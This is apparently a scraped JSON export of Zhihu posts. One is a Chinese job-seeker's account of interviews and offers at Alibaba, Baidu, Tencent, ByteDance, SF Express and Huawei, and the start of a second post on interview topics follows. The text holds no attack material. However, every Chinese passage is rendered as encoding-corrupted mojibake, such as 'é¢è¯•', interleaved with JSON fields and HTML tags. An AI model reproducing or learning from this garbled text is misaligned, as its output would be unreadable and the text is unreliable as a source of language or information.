é¢è™½ç„¶ä¸æ˜¯å¾ˆç†æƒ³ï¼Œä½†æ˜¯æ²¡æœ‰å¾ˆå¤§çš„é—®é¢˜ã€‚åˆè¿‡äº†å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œåœ¨æˆ‘å»æ·±åœ³å‚åŠ è…¾è®¯æ‹›è˜çš„é«˜é“ä¸Šï¼Œæ”¶åˆ°äº†é«˜å¾·åœ°å›¾ HR çš„ç”µè¯ï¼Œé—®æ˜¯å¦æ„¿æ„å»ã€‚è™½ç„¶å¾—çŸ¥éƒ¨é—¨åœ¨åŒ—äº¬æœ‰ç‚¹å°å¤±è½ï¼Œä½†æ˜¯è¿˜æ˜¯å¾ˆå¼€å¿ƒç»ˆäºè¢«é˜¿é‡Œè®¤å¯äº†ï¼Œæ‘†è„±äº†å¯¹é˜¿é‡Œçš„ææƒ§ã€‚</p><p>å®éªŒå®¤ä¸Šå±Šæ¯•ä¸šåœ¨é˜¿é‡Œäº‘çš„å¤§ä½¬æŸå¤©çªç„¶å’Œæˆ‘è¯´ï¼Œä»–ä»¬éƒ¨é—¨æœ‰æ–°çš„ HCï¼Œè®©æˆ‘æŠŠç®€å†å‘ç»™ä»–ï¼Œä»–è¦å¸®æˆ‘å†…æ¨ï¼Œä¼šå¸®æˆ‘å®‰æ’ä¸€åœºçº¿ä¸‹é¢è¯•ï¼Œå¦‚æœé€šè¿‡çš„è¯ï¼Œåˆ°æ—¶å€™å’Œé«˜å¾·çš„ HR æ²Ÿé€šä¸€ä¸‹ï¼Œç›´æ¥æŠŠæˆ‘ä»é«˜å¾·æè¿‡æ¥ã€‚å¾ˆæ„Ÿè°¢å¤§ä½¬å‘ä»–è€å¤§æåŠ›æ¨èæˆ‘ï¼Œç»™æˆ‘äº†è¿™æ¬¡é¢è¯•æœºä¼šã€‚çº¿ä¸‹é¢è¯•ä¹Ÿå¾ˆé¡ºåˆ©ï¼ŒèŠèŠå®ä¹ é¡¹ç›®ï¼Œé—®é—®æˆ‘çš„å¼€æºåšå®¢ï¼Œç„¶åé—®äº› Paxos ç­‰åˆ†å¸ƒå¼çš„é—®é¢˜ï¼Œè¿˜æœ‰å°±æ˜¯æ‰‹å†™ä»£ç ï¼Œä¿¡å·é‡å®ç°ç”Ÿäº§è€…æ¶ˆè´¹è€…ï¼Œä»¥åŠä¸€ä¸ªä½è¿ç®—çš„é—®é¢˜ã€‚å…¶å®ä½è¿ç®—çš„é—®é¢˜é¢è¯•çš„æ—¶å€™å†™çš„ä¸å®Œå–„ï¼Œé¢è¯•å®˜è®©æˆ‘ä¹‹åå®Œå–„äº†å†å‘ç»™ä»–ï¼Œå› ä¸ºé¢è¯•ä¸€ä¸ªå¤šå°æ—¶æœ‰ç‚¹é•¿äº†ã€‚è¿‡åæˆ‘å†™äº†è¯¦ç»†æ–‡æ¡£è®²è§£äº†æ€è·¯ï¼Œä»¥åŠä½¿ç”¨ JUnit è¿›è¡Œäº†è¯¦ç»†çš„å•å…ƒæµ‹è¯•ï¼ŒæŠŠæ–‡æ¡£å’Œä»£ç éƒ½å‘ç»™äº†ä»–ã€‚ç°åœ¨é¢è¯•å·²ç»é€šè¿‡äº†ï¼Œä½†æ˜¯æœ€è¿‘é˜¿é‡Œé›†å›¢ HC æ¯”è¾ƒç´§å¼ ï¼Œä¹Ÿä¸çŸ¥é“èƒ½ä¸èƒ½æ‰¹åˆ° HCã€‚</p><h2>4.3 ç™¾åº¦åˆæ˜¯ä¸é‚£ä¹ˆæ»¡æ„çš„éƒ¨é—¨</h2><p>è™½ç„¶é˜¿é‡Œæ˜¯æœ€å…ˆå¼€å§‹æµç¨‹ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªå‚åŠ é¢è¯•çš„æ˜¯ç™¾åº¦ã€‚å› ä¸ºå®ä¹ çš„æ—¶å€™é€šè¿‡äº†ç™¾åº¦çš„é¢è¯•ï¼Œæ‰€ä»¥è¿™æ¬¡é¢è¯•è¿˜æ˜¯æ¯”è¾ƒæœ‰ä¿¡å¿ƒçš„ã€‚ç™¾åº¦é¢è¯•è¿ç»­ä¸‰å¤©ï¼Œéƒ½åœ¨åŒä¸€ä¸ªåœ°æ–¹ï¼Œæœ€åç­¾çº¦ä¹Ÿåœ¨åŒä¸€ä¸ªåœ°æ–¹ã€‚è¿˜è®°å¾—æ¯æ¬¡éƒ½åä¸€ä¸ªå°æ—¶å·¦å³çš„åœ°é“å»é‚£é‡Œï¼Œè·¯çº¿å·²ç»éå¸¸ç†Ÿæ‚‰äº†ï¼Œå’Œæ¯å¤©å»å®ä¹ çš„æ„Ÿè§‰ç±»ä¼¼ã€‚ç™¾åº¦é¢è¯•æ¯”è¾ƒæ³¨é‡æŠ€æœ¯ï¼Œä¸‰è½®é¢è¯•åŸºæœ¬éƒ½æ˜¯é—®æŠ€æœ¯é—®é¢˜ï¼Œè€Œä¸”é—®çš„ä¹Ÿæ¯”è¾ƒæ·±å…¥ï¼Œå†…å®¹ä¹Ÿéå¸¸å¹¿ã€‚ä½†æ˜¯é¢çš„ä¸æ˜¯é‚£ä¹ˆç†æƒ³ï¼Œæœ‰ä¸¤ç‚¹åŸå› ï¼Œé¦–å…ˆæ˜¯å› ä¸ºç¡®å®æœ‰äº›çŸ¥è¯†ç‚¹è¿˜æ²¡æŒæ¡å¥½ï¼Œæ¯”å¦‚ AC è‡ªåŠ¨æœºï¼Œç³»ç»Ÿæ•…éšœåˆ†æç­‰ç­‰ï¼›å…¶æ¬¡æ˜¯å¯¹å®ä¹ é¡¹ç›®çš„æè¿°ä¸Šè¿˜ä¸å¤Ÿå¥½ï¼Œæ²¡æœ‰æŠŠå®ä¹ å†…å®¹çš„é—ªå…‰ç‚¹æè¿°å‡ºæ¥ï¼Œä¹Ÿæ²¡æœ‰è®²æ¸…æ¥šä¸ºä»€ä¹ˆåšè¿™ä¸ªé¡¹ç›®ï¼Œè‡ªå·±é€šè¿‡ä»€ä¹ˆæ–¹æ³•å»åšï¼Œä»¥åŠæœ€åçš„ç»“æœã€‚</p><p>æœ€åç™¾åº¦ç»™äº†ç™½èœä»·ï¼Œéƒ¨é—¨æ˜¯ä¼ä¸šæ™ºèƒ½å¹³å°ï¼Œä¸»è¦æ˜¯å†…éƒ¨ç³»ç»Ÿï¼Œè™½ç„¶ä¼šæ¥è§¦åˆ°æœºå™¨å­¦ä¹ å’Œå¤§æ•°æ®ã€‚</p><h2>4.4 è…¾è®¯è™æˆ‘åƒç™¾é</h2><p>ç§‹æ‹›è…¾è®¯ç¬¬ä¸€åœºé¢è¯•å’Œå®ä¹ å‚åŠ è…¾è®¯é¢è¯•çš„æ„Ÿè§‰éå¸¸åƒï¼Œç¬¬ä¸€è½®æŠ€æœ¯é¢æ„Ÿè§‰å¾ˆå¥½ï¼Œæ‰‹å†™å †æ’åºç®—æ³•ï¼ŒäºŒéƒ¨å›¾åˆ†æç­‰ç­‰ã€‚é¢å®Œä¹‹åé€šçŸ¥å¾…ä¼šå„¿äºŒé¢ï¼Œå¬åˆ°ä¹‹åè¿˜æ˜¯å¾ˆæ¿€åŠ¨çš„ï¼Œè§‰å¾—è¿™æ¬¡åº”è¯¥æ²¡é—®é¢˜äº†ã€‚æˆ‘åœ¨ç­‰äºŒé¢çš„æ—¶å€™ï¼Œç¢°åˆ°äº†å®¤å‹ï¼ˆä»–ç»å¸¸ä¸ä½å®¿èˆï¼Œæ‰€ä»¥ä¸æ¸…æ¥šä»–ä¹Ÿå»é¢è¯•ï¼‰ï¼ŒèŠç€èŠç€å±…ç„¶å‘ç°æˆ‘ä¸¤æ˜¯åŒä¸€ä¸ªé¢è¯•å®˜ï¼Œè€Œä¸”ä»–æ˜¯æ¥äºŒé¢çš„ï¼Œä¹Ÿå°±æ˜¯ç­‰ä¸€ä¸‹æˆ‘ä¸¤å°±è¦ä¸€å‰ä¸€åè¿›å»é¢è¯•ã€‚äºŒé¢çš„æ„Ÿè§‰å’Œå®ä¹ äºŒé¢éå¸¸åƒï¼ŒéæŠ€æœ¯é—®é¢˜å›ç­”çš„æ”¯æ”¯å¾å¾ï¼Œç„¶åé¢è¯•å®˜å¼€å§‹è´¨ç–‘æˆ‘è¯´çš„å†…å®¹ï¼Œç»™æˆ‘å‹åŠ›ï¼Œæˆ‘æ²¡æœ‰å½“åœºåé©³ï¼Œå°±è¯´äº†å“¦ï¼Œå¥½åƒæ˜¯è¿™æ ·çš„ã€‚å› ä¸ºé¢è¯•å®˜å…¨ç¨‹éƒ½ç»·ç€è„¸ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿæ¯”è¾ƒç´§å¼ ï¼Œå¾ˆå¤šé—®é¢˜æ²¡å›ç­”å¥½ã€‚è¿‡äº†å‡ å¤©ï¼Œå®¤å‹å’Œæˆ‘è¯´æ”¶åˆ° HR é¢è¯•é€šçŸ¥äº†ï¼Œæˆ‘å»å®˜ç½‘çœ‹äº†ä¸€ä¸‹çŠ¶æ€ï¼Œå·²ç»å˜æˆäº†ç†Ÿæ‚‰çš„ä¸åˆé€‚ã€‚è¿™æ¬¡é¢è¯•å¤±è´¥çš„ä¸»è¦åŸå› æ˜¯è‡ªå·±åœ¨åº”å¯¹è¿™ç§å‹åŠ›æ—¶å¤„ç†åœ°ä¸æ˜¯å¾ˆå¥½ï¼Œä¸»è¦ä½“ç°åœ¨å¤±å»ä¿¡å¿ƒä»¥åŠç´§å¼ ã€‚è§£å†³æ–¹æ³•ä¹Ÿç®€å•ï¼Œåšå¥½å……åˆ†å‡†å¤‡æ¥ä¿æŒä¿¡å¿ƒï¼Œå—åˆ°è´¨ç–‘çš„æ—¶å€™ç§¯æåé©³ï¼Œç´§å¼ çš„æ—¶å€™è®¡æ—¶è°ƒæ•´å¿ƒæ€ï¼Œå¯ä»¥è¯•è¯•æ·±å‘¼å¸æˆ–è€…å–æ°´ã€‚</p><p>å› ä¸ºå®ä¹ æœ‰è¢«æèµ·æ¥çš„ç»å†ï¼Œæ‰€ä»¥è¢«æ‹’ä¹‹åæˆ‘ç‰¹åˆ«å¸Œæœ›èƒ½ç»§ç»­è¢«æèµ·æ¥ï¼Œç„¶åæŠŠç®€å†ä¸Šçš„é¢è¯•åŸå¸‚æ”¹æˆäº†æ·±åœ³ã€‚è‹¦è‹¦ç­‰åˆ°æ·±åœ³åœºé¢è¯•çš„å‰å‡ å¤©ï¼Œåœ¨ä¸ç»æ„çš„ä¸€ä¸ªä¸‹åˆæ‰‹æœºçªç„¶å“äº†ï¼Œæˆ‘è®°å¾—æ˜¯çŸ­ä¿¡é‚®ä»¶åŒæ—¶æ”¶åˆ°é¢è¯•é€šçŸ¥ã€‚äºæ˜¯åˆå¼€å§‹äº†æ–°ä¸€è½®è¢«è…¾è®¯è™çš„é¢è¯•ä¹‹æ—…ã€‚</p><p>ä¸€é¢å’Œä¹‹å‰ä¸€æ ·ä¹Ÿæ˜¯æ„å¤–åœ°é¡ºåˆ©ï¼Œè™½ç„¶é—®äº†ä¸€äº› C++ çš„é—®é¢˜ï¼Œä½†æ˜¯æˆ‘éƒ½è¯´åˆ° Java ç›¸å…³çš„å®ç°ä¸Šã€‚åœ¨ä¸€äº›é—®é¢˜ä¸Šç¡®å®å›ç­”çš„æ·±åº¦ä¸å¤Ÿï¼Œæ¯”å¦‚ç½‘ç»œç¼–ç¨‹é‡Œé¢çš„æ°´å¹³è§¦å‘å’Œè¾¹ç¼˜è§¦å‘ç­‰é—®é¢˜ã€‚ç„¶åé—®äº†å‡ ä¸ªç®—æ³•ï¼Œæœ¬æ¥è¦æ±‚æ‰‹å†™ï¼Œæˆ‘è¯´æˆ‘å®ç°è¿‡ï¼Œæ‰€ä»¥å°±è®²äº†è®²æ€è·¯ã€‚é¢è¯•å’Œè…¾è®¯ç¬¬ä¸€åœºé¢è¯•ä¸€æ ·æŒç»­äº†ä¸€ä¸ªåŠå°æ—¶ï¼Œé¢è¯•å®˜ä¹Ÿå¾ˆå¥½ï¼Œå¾ˆå¤šé—®é¢˜éƒ½ä¼šç»™æç¤ºï¼Œå³ä½¿æœ€å¼€å§‹å›ç­”çš„æœ‰é—®é¢˜ã€‚äºŒé¢é¢è¯•å®˜ä¹Ÿå¾ˆå¥½ï¼Œé—®äº†é—®å®ä¹ é¡¹ç›®ï¼Œç„¶åå†èŠä¸€èŠä¸€äº›æŠ€æœ¯ï¼Œç»è¿‡äº†ä¹‹å‰çš„é¢è¯•ï¼Œåˆ°è¿™æ¬¡é¢è¯•çœŸçš„å°±åƒåœ¨èŠå¤©ä¸€æ ·è€Œä¸æ˜¯é¢è¯•ï¼Œæˆ‘ä»¬éƒ½ä¼šè¯´ä¸€äº›å¯¹æŠ€æœ¯ä¸Šçš„ç†è§£ã€‚HR é¢å…¶å®é¢å¾—å¾ˆå·®ï¼Œå¯¹äºéæŠ€æœ¯é—®é¢˜çš„å¹æ°´èƒ½åŠ›æˆ‘è¿˜æ˜¯ä¸å¤ªè¡Œã€‚æœ€ç»ˆå’Œæˆ‘é¢„æœŸçš„ä¸€æ ·ï¼Œç»™äº†æˆ‘ SP çš„ Offerï¼Œå› ä¸ºè§‰å¾—è‡ªå·±é¢å¾—è¿˜å¯ä»¥ï¼Œä½†æ˜¯ä¹Ÿä¸å¤Ÿå¥½åˆ°ç»™ SSPï¼Œæœ‰äº› C++ é—®é¢˜è¿˜æ˜¯æ²¡å›ç­”çš„ç‰¹åˆ«å¥½ã€‚</p><h2>4.5 å¤´æ¡æ„å¤–çš„æƒŠå–œ</h2><p>ä¹‹å‰çœ‹åˆ°å­¦å¼Ÿæ”¶åˆ°å¤´æ¡çš„ Offerï¼Œè–ªèµ„éå¸¸è¯±äººï¼Œæ‰€ä»¥ä¹Ÿæƒ³å»è¯•è¯•ã€‚ä¹Ÿå¬è¯´å¤´æ¡é¢è¯•éš¾åº¦éå¸¸å¤§ï¼Œä¸»è¦è€ƒå¯Ÿæ‰‹å†™ç®—æ³•ï¼Œå› ä¸ºè‡ªå·±ç®—æ³•æ–¹é¢å‡†å¤‡å¾—æ¯”è¾ƒå……åˆ†ï¼Œæ‰€ä»¥è§‰å¾—ä¼šæ¯”è¾ƒé¡ºåˆ©ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰ç‰¹åˆ«é«˜çš„é¢„æœŸã€‚å‰ä¸¤é¢ä¸­è§„ä¸­çŸ©ï¼Œç®—æ³•é¢˜å’Œå…¶å®ƒé—®é¢˜æˆ‘éƒ½å›ç­”çš„æ¯”è¾ƒå¥½ï¼Œåˆ°ä¸‰é¢çš„æ—¶å€™ï¼Œé—®äº†ä¸€ä¸ªé”™æ’é—®é¢˜ï¼Œå…¶å®æœ€å¼€å§‹æˆ‘ç»™äº†æ­£ç¡®çš„é€’æ¨å…¬å¼ï¼Œä½†ä¸æ˜¯é¢è¯•å®˜æƒ³è¦çš„ç­”æ¡ˆï¼Œæ‰€ä»¥è®©æˆ‘å†æƒ³æƒ³ã€‚æˆ‘æƒ³äº†åå‡ åˆ†é’Ÿè¿˜æ˜¯è§‰å¾—æ²¡é—®é¢˜ï¼Œé‚£æ—¶å€™è§‰å¾—è‡ªå·±å·²ç»å‡‰äº†ï¼Œå› ä¸ºé¢è¯•å®˜ä¸€ç›´ä¸æ»¡æ„ã€‚åé¢çš„å‡ ä¸ªé—®é¢˜ä¹Ÿæ²¡å›ç­”çš„å¾ˆå¥½ï¼Œåˆ†æä¸€ä¸ª SQL è¯­å¥çš„å…·ä½“æ‰§è¡Œè¿‡ç¨‹ï¼Œæ¯”å¦‚ä¼šæ€ä¹ˆåˆ©ç”¨ç´¢å¼•ï¼Œæ€ä¹ˆä¼˜åŒ–ä¹‹ç±»çš„ï¼Œè™½ç„¶åœ¨ä»–çš„æç¤ºä¸‹è¿˜æ˜¯å›ç­”äº†ï¼Œä½†æ˜¯æ„Ÿè§‰å¹¶ä¸å¥½ã€‚é¢å®Œä¹‹åæˆ‘ç«‹é©¬æŸ¥äº†ä¸€ä¸‹é‚£ä¸ªé”™æ’é—®é¢˜ï¼Œè¯å®äº†æˆ‘çš„ç­”æ¡ˆæ˜¯æ­£ç¡®çš„ï¼Œäºæ˜¯å†™äº†ä¸€ä¸ªè¯¦ç»†çš„æ–‡æ¡£ï¼Œè”ç³» HR è®©å¥¹å‘ç»™é¢è¯•å®˜ã€‚å‡ºä¹æ„æ–™çš„æ˜¯ï¼ŒHR è®©æˆ‘ä¸ç”¨æ‹…å¿ƒï¼Œä»–è¯´é¢è¯•å®˜å¯¹æˆ‘çš„è¯„ä»·å¾ˆå¥½... ä¸è¿‡æœ€åè¿˜æ˜¯è®©å¥¹æŠŠæ–‡æ¡£å‘ç»™äº†é¢è¯•å®˜ã€‚ä¹‹åæ”¶åˆ°äº†åŠ é¢é€šçŸ¥ï¼Œå¤´æ¡åŠ é¢æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€æ˜¯ä¸‰è½®è¯„çº§éƒ½æ˜¯ 4 å¯ä»¥è¯„ SSPï¼ŒäºŒæ˜¯é¢è¯•å®˜è¯„ä»·å·®åˆ«å¾ˆå¤§ï¼Œå†é¢ä¸€è½®å†³å®šæ˜¯å¦å½•ç”¨ã€‚æ”¶åˆ°åŠ é¢çš„æ—¶å€™å®Œå…¨ä¸çŸ¥é“è‡ªå·±å±äºå“ªä¸€ç§ï¼Œæ„Ÿè§‰ä¸¤ç§æƒ…å†µéƒ½æœ‰å¯èƒ½ã€‚åŠ é¢å›ç­”çš„ä¹Ÿä¸å¥½ï¼Œä¸»è¦æ˜¯é—®é¡¹ç›®ï¼Œé¢äº† 25 åˆ†é’Ÿå°±è‰è‰ç»“æŸï¼Œæœ€åé¢è¯•å®˜è¯´æœ‰äº›å†…å®¹éœ€è¦æ‰¾ä¸€äº›æ–‡çŒ®å‚è€ƒå‚è€ƒã€‚é¢å®Œä¹‹åæˆ‘è§‰å¾—ï¼Œå³ä½¿æˆ‘å±äºç¬¬ä¸€ç§è¦è¯„ SSP çš„æƒ…å†µï¼ŒåŠ é¢é¢çš„é‚£ä¹ˆå·®åº”è¯¥ä¹Ÿæ²¡å¸Œæœ›äº†ã€‚è‹¦è‹¦ç­‰äº†å¥½å¤šå¤©ä¹‹åï¼Œæœ€åç¡®å®šæ˜¯ SSP ä¹‹åï¼Œè¿˜æ˜¯å¾ˆæƒŠå–œçš„ï¼Œæ„Ÿè§‰æ˜¯å¯¹è‡ªå·±è¿™ä¹ˆé•¿æ—¶é—´å¤ä¹ çš„ä¸€ä¸ªè®¤å¯ã€‚</p><h2>4.6 é¡ºä¸°æœ€åçš„ä¿åº•</h2><p>æŠ•é¡ºä¸°æ˜¯å› ä¸ºä¹æœˆä¸­æ—¬å¾ˆå¤šå…¬å¸éƒ½ç»“æŸäº†æ‹›è˜ï¼Œæ‰€ä»¥é‚£æ—¶å€™æ¯”è¾ƒæ…Œï¼Œå°±æŠ•äº†é¡ºä¸°å½“åšä¿åº•ï¼Œé¡ºä¾¿ä¹Ÿç»ƒç»ƒæ‰‹ã€‚æœ€å¼€å§‹è¿˜æ‹…å¿ƒé¡ºä¸°ç¬”è¯•æ²¡é€šè¿‡ï¼Œå› ä¸ºç¼–ç¨‹é¢˜æœ€åä¸€é¢˜æ²¡åšå‡ºæ¥ï¼Œé‚£é¢˜çš„é¢˜ç›®éƒ½å‡ºé”™äº†ï¼Œè€Œä¸”é¢˜ç›®æ˜¯ç½‘ä¸Šç›´æ¥ copy è¿‡æ¥çš„ï¼Œç½‘ä¸Šçš„æºç éƒ½ä¸èƒ½é€šè¿‡ï¼Œæ›´åˆ«è¯´æˆ‘è‡ªå·±çš„å®ç°äº†ã€‚é¡ºä¸°é¢è¯•ä¸»è¦é—®äº†æ•°æ®åº“çš„å†…å®¹ï¼Œè€Œä¸”é—®çš„ç‰¹åˆ«æ·±ï¼Œå‡ ä¹æŠŠæ¯ç§æ—¥å¿—çš„å®ç°å’Œä½œç”¨éƒ½é—®äº†ä¸€éã€‚é¢é¡ºä¸°çš„æ—¶å€™ä¹Ÿæ¯”è¾ƒæ—©ï¼Œé‚£æ—¶å€™æœ‰äº›é—®é¢˜çš„å›ç­”ä¸Šæ²¡æœ‰ç»„ç»‡å¥½ï¼Œå›ç­”å¾—æ¯”è¾ƒå‡Œä¹±ï¼Œè™½ç„¶æœ€åä¹Ÿç®—ç»™äº†ä¸€ä¸ªå° SPã€‚</p><h2>4.7 åä¸ºç‰¹åˆ«çº ç»“çš„éƒ¨é—¨</h2><p>å»åä¸ºé¢è¯•ç¡®å®æ˜¯æ²¡æœ‰å‹åŠ›çš„ï¼Œå› ä¸ºéƒ½çŸ¥é“åä¸ºé¢è¯•ä¸æ€ä¹ˆé—®æŠ€æœ¯ï¼Œè™½ç„¶è¿˜æ˜¯é—®äº†æˆ‘ä¸€äº›æŠ€æœ¯é—®é¢˜ï¼Œä¸è¿‡ä¸æ˜¯é—®çš„å¾ˆæ·±ã€‚é¢è¯•ä¸»è¦ä»‹ç»é¡¹ç›®ï¼Œæˆ‘å¯¹è‡ªå·±çš„å®ä¹ é¡¹ç›®è¿˜æ˜¯æ¯”è¾ƒæœ‰ä¿¡å¿ƒçš„ï¼Œå› ä¸ºè§‰å¾—åšçš„ç¡®å®ä¸é”™ï¼Œè€Œä¸”é¢äº†å¾ˆå¤šåœºäº†ï¼ŒçŸ¥é“è¯¥æ€ä¹ˆä»‹ç»é¡¹ç›®ã€‚é¢è¯•å®˜é—®æˆ‘ä¸ªäººæ„æ„¿ï¼Œæˆ‘è¯´è‡ªå·±å¯¹åˆ†å¸ƒå¼ä¸­é—´ä»¶ç­‰æ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œäºæ˜¯é¢è¯•å®˜æŠŠæˆ‘æ¨èåˆ°äº† Cloud Buã€‚æœ¬æ¥æ²¡æ‰“ç®—ç­¾åä¸ºçš„ï¼Œç°åœºç­¾çº¦ä¹Ÿå°±å»çœ‹çœ‹åˆ°åº•ç»™æˆ‘å¼€å¤šå°‘ã€‚æœ€å¼€å§‹å…¶å®ç»™æˆ‘å¼€äº†åå››çº§æœ€é«˜çš„è–ªèµ„ï¼Œæˆ‘æœ¬æ¥ä¸æ˜¯å¾ˆæƒ³å»ï¼Œè™½ç„¶å¯¹è¿™ä¸ªéƒ¨é—¨æ„Ÿå…´è¶£ï¼Œä½†æ˜¯è–ªèµ„ç¡®å®æ¯”ä¸ä¸Šå¤´æ¡ã€‚ç„¶åéšå£é—®äº†ä¸€å¥å¯ä¸å¯ä»¥ç»™åäº”çº§ï¼Œæœ¬æ¥ HR è¯´æ˜¯å¯ä»¥è¯•ç€ç”³è¯·ä¸€ä¸‹ï¼Œä¸è¿‡æœ€åæ²¡ç”³è¯·æˆåŠŸã€‚</p><p>ğŸš€</p><h2>5. å°ç»“</h2><p>å¾ˆå¤šäººéƒ½è¯´ï¼Œé¢è¯•å’Œè€ƒè¯•ä¸€æ ·ï¼Œè¦èƒŒå¾ˆå¤šæ²¡ç”¨çš„ä¸œè¥¿ã€‚æœ€å¼€å§‹æˆ‘ä¹Ÿè®¤åŒè¿™ç§çœ‹æ³•ï¼Œå¯æ˜¯å‚åŠ äº†å‡ åœºé¢è¯•ä¹‹åï¼Œæˆ‘å°±ä¸è¿™ä¹ˆè®¤ä¸ºäº†ã€‚å› ä¸ºé¢è¯•å‡ºçš„é—®é¢˜ï¼Œæœ‰å¾ˆå¤šæ˜¯å®é™…å¼€å‘ä¸­ç¢°åˆ°çš„ï¼Œæ‰€ä»¥å‡†å¤‡é¢è¯•ç›¸å½“äºæå‰åšå…¥èŒå‡†å¤‡ã€‚è€Œä¸”é¢è¯•ä¸­è€ƒå¯Ÿçš„æ€ç»´èƒ½åŠ›ã€äº¤æµè¡¨è¾¾èƒ½åŠ›ã€åº”å¯¹å‹åŠ›èƒ½åŠ›ï¼Œéƒ½æ˜¯çœŸæ­£å·¥ä½œä¸­æ‰€éœ€è¦çš„ã€‚</p><p>æˆ‘è§‰å¾—è‡ªå·±æ¯”åˆ«äººåšçš„å¥½çš„åœ°æ–¹æ˜¯ï¼Œæœ‰å¾ˆå¼ºçƒˆçš„æƒ³æ‰¾åˆ°å¥½å·¥ä½œçš„æ„æ„¿ï¼Œæ‰é©±ä½¿æˆ‘ä¸æ–­å­¦ä¹ ï¼Œæ‰€ä»¥æ€åº¦å¾ˆé‡è¦ã€‚</p><p>ä¿¡å¿ƒæºè‡ªäºå……åˆ†å‡†å¤‡ï¼Œæœ‰äº†ä¿¡å¿ƒï¼Œé¢è¯•çš„æ—¶å€™æ‰èƒ½æ¸¸åˆƒæœ‰ä½™ã€‚è€Œæ¯«æ— ä¾æ®çš„è‡ªæˆ‘æ„Ÿè§‰è‰¯å¥½ï¼Œåœ¨æ¯æ¬¡å¤±è´¥ä¹‹åéƒ½çœ‹ä¸åˆ°è‡ªèº«çš„ä¸è¶³ï¼Œè€Œæ˜¯æ€ªç½ªäºå¤–ç•Œå› ç´ ã€‚</p><p>åšå¥½è‡ªå·±çš„ç®€å†ï¼Œæˆ‘åœ¨ç®€å†ä¸ŠèŠ±äº†å¾ˆé•¿æ—¶é—´ï¼Œåªè¦å…è®¸ï¼Œæˆ‘éƒ½ä¼šç”¨è¿™ä¸ªç®€å†ç»™é¢è¯•å®˜æ¼”ç¤ºï¼š<a href=\"https://link.zhihu.com/?target=https%3A//cyc2018.github.io/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">ä¸ªäººç®€å†</a>ã€‚</p>", 
            "topic": [
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/56655484", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 6, 
            "title": "ä¸€æ–‡å¸®ä½ ç†æ¸…é¢è¯•çŸ¥è¯†ç‚¹", 
            "content": "<p>â­ï¸</p><h2>1. å‰è¨€</h2><p>é¢è¯•è€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹å¤šè€Œæ‚ï¼Œè¦å®Œå…¨æŒæ¡éœ€è¦èŠ±è´¹å¤§é‡çš„æ—¶é—´å’Œç²¾åŠ›ã€‚ä½†æ˜¯é¢è¯•ä¸­ç»å¸¸è¢«é—®åˆ°çš„çŸ¥è¯†ç‚¹å´æ²¡æœ‰å¤šå°‘ï¼Œä½ å®Œå…¨å¯ä»¥ç”¨ 20% çš„æ—¶é—´å»æŒæ¡ 80% å¸¸é—®çš„çŸ¥è¯†ç‚¹ã€‚åœ¨è¿™é‡Œæˆ‘å°†è¿™ 80% å¸¸é—®çš„çŸ¥è¯†ç‚¹æ•´ç†å‡ºæ¥ï¼Œæ–¹ä¾¿å¤§å®¶å¿«é€Ÿåœ°æŒæ¡ã€‚è¿™äº›çŸ¥è¯†ç‚¹ä¹Ÿæ ‡æ³¨äº†é‡è¦ç¨‹åº¦ï¼Œä»è€Œè®©å¤§å®¶å¯ä»¥æ ¹æ®çŸ¥è¯†ç‚¹çš„é‡è¦ç¨‹åº¦å»åˆ¶å®šå­¦ä¹ è®¡åˆ’ã€‚</p><p>å¦‚æœä½ æƒ³æ›´å¥½çš„å­¦ä¹ è¿™äº›çŸ¥è¯†ç‚¹ï¼Œå¯ä»¥å‚è€ƒ <a href=\"https://link.zhihu.com/?target=https%3A//xiaozhuanlan.com/topic/4150387926\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">çŸ¥è¯†æ€»ç»“æ–¹æ³•</a> ä¸€æ–‡ï¼Œè¿™ç¯‡æ–‡ç« çš„æœ€åç»™å‡ºäº†æ¯”æœ¬æ–‡æ›´è¯¦ç»†çš„æ€ç»´å¯¼å›¾ã€‚</p><p>ä¸‹å›¾åˆ—å‡ºäº†é¢è¯•è€ƒå¯Ÿçš„ä¹å¤§çŸ¥è¯†ç‚¹ï¼Œä¹Ÿæ ‡å‡ºäº†é‡è¦ç¨‹åº¦å’Œå¤ä¹ éš¾åº¦ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-0d02c6abbff188420801c11dc54945e1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1071\" data-rawheight=\"481\" class=\"origin_image zh-lightbox-thumb\" width=\"1071\" data-original=\"https://pic2.zhimg.com/v2-0d02c6abbff188420801c11dc54945e1_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1071&#39; height=&#39;481&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1071\" data-rawheight=\"481\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1071\" data-original=\"https://pic2.zhimg.com/v2-0d02c6abbff188420801c11dc54945e1_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-0d02c6abbff188420801c11dc54945e1_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å…¶å®é‡è¦ç¨‹åº¦æ ¹æ®ä¸åŒçš„å…¬å¸ä¼šæœ‰æ‰€ä¸åŒï¼Œé’ˆå¯¹ä¸Šå›¾åšä¸€ä¸‹å‡ 